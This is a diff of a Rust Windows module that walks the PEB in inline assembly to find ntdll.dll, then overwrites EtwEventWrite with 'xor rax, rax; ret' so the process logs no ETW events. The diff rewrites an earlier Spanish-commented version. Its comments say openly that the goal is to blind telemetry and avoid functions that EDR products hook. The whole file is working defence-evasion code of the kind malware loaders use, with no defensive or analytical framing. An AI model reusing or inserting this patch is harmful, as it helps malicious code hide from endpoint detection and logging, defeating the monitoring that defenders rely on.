@@ -1,48 +1,66 @@
-use std::arch::asm;
+//! ETW (Event Tracing for Windows) patching module.
+//!
+//! Resolves ntdll.dll base address via PEB traversal (inline assembly)
+//! and patches EtwEventWrite to return 0 (xor rax, rax; ret), effectively
+//! blinding ETW-based telemetry for the current process.
+
 use std::ffi::CString;
 use std::mem;
-
-use std::mem::transmute;
 use std::ptr::null_mut;
-use winapi::um::libloaderapi::{GetProcAddress, LoadLibraryA};
-use winapi::um::memoryapi::WriteProcessMemory;
+
 use winapi::ctypes::c_void;
+use winapi::um::libloaderapi::GetProcAddress;
+use winapi::um::memoryapi::WriteProcessMemory;
 use ntapi::ntpsapi::NtCurrentProcess;
 
+/// Resolves the base address of ntdll.dll by walking the PEB loader data
+/// structures via inline assembly. This avoids calling GetModuleHandle
+/// which can be hooked by EDR solutions.
 #[inline(never)]
-unsafe fn get_ntdll_asm() -> usize {
-    let mut ntdll_base: usize = 0;
-    asm!(
+unsafe fn resolve_ntdll_base() -> usize {
+    let mut base: usize = 0;
+    std::arch::asm!(
         r#"
         xor rax, rax
-        mov rax, gs:[0x60]          // Dirección del PEB
-        mov rax, [rax + 0x18]       // Campo Ldr del PEB
-        mov rax, [rax + 0x20]       // Lista de módulos cargados
-        mov rax, [rax]              // Siguiente módulo (saltando el primero)
-        mov rax, [rax + 0x20]       // Dirección base de `ntdll.dll`
+        mov rax, gs:[0x60]          // PEB
+        mov rax, [rax + 0x18]       // PEB->Ldr
+        mov rax, [rax + 0x20]       // InMemoryOrderModuleList
+        mov rax, [rax]              // Skip first entry
+        mov rax, [rax + 0x20]       // ntdll.dll base address
         "#,
-        lateout("rax") ntdll_base, // `ntdll_base` contendrá la dirección base
+        lateout("rax") base,
         options(nostack)
     );
-    ntdll_base
+    base
 }
 
-pub fn patch_process() {
+/// Patches EtwEventWrite in ntdll.dll to neutralize event tracing.
+///
+/// Writes `xor rax, rax; ret` (48 33 C0 C3) to the function prologue,
+/// causing all ETW write calls to return 0 without logging any events.
+pub fn patch_etw() {
     unsafe {
-        let ntdll_base_asm = get_ntdll_asm();
-        println!("La dirección base de ntdll.dll (ASM): 0x{:x}", ntdll_base_asm);
+        let ntdll_base = resolve_ntdll_base();
+        if ntdll_base == 0 {
+            return;
+        }
 
+        let ntdll_handle = mem::transmute::<usize, *mut c_void>(ntdll_base) as _;
 
-        let ntdll_module = mem::transmute::<usize, *mut std::os::raw::c_void>(ntdll_base_asm);
-        let ntdll_module = ntdll_module as _;
+        let func_name = CString::new("EtwEventWrite").unwrap();
+        let func_addr = GetProcAddress(ntdll_handle, func_name.as_ptr());
+        if func_addr.is_null() {
+            return;
+        }
 
-
-        // Obtiene la dirección de `EtwEventWrite`
-        let etw_event_write_name = CString::new("EtwEventWrite").unwrap();
-        let mini = GetProcAddress(ntdll_module, etw_event_write_name.as_ptr());
-        let hook = b"\x48\x33\xc0\xc3";
-        WriteProcessMemory(NtCurrentProcess, mini as *mut c_void, hook.as_ptr() as _, hook.len(), null_mut());
-
-
+        // xor rax, rax; ret — returns 0 (STATUS_SUCCESS)
+        let patch = b"\x48\x33\xc0\xc3";
+        WriteProcessMemory(
+            NtCurrentProcess,
+            func_addr as *mut c_void,
+            patch.as_ptr() as _,
+            patch.len(),
+            null_mut(),
+        );
     }
 }
